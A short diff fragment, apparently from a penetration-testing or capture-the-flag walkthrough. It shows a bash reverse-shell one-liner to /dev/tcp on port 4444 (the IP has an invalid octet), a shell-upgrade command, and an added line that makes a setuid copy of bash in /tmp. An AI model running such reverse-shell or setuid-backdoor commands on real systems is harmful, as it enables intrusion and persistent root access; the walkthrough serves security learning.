@@ -34,3 +34,5 @@ bash -i >& /dev/tcp/10.21.23.434/4444 0>&1
 Let’s first spawn a better shell:
 
 $ SHELL=/bin/bash script -q /dev/null
+
+cp /bin/bash /tmp/bash && chmod +s /tmp/bash
